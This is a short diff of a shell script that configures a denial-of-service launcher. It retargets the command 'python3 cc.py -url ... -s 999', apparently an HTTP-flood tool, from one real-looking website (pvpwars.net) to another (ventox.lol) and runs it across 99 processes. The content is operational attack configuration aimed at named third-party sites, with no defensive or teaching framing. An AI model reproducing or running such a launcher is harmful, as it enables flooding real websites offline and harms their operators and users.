@@ -6,7 +6,7 @@
 #  Lastly run this script
 #
 #the command you want to exec
-atk_cmd="python3 cc.py -url https://pvpwars.net -v 5 -s 999"
+atk_cmd="python3 cc.py -url https://ventox.lol -v 4 -s 999"
 
 #number of process that you want
 process=99
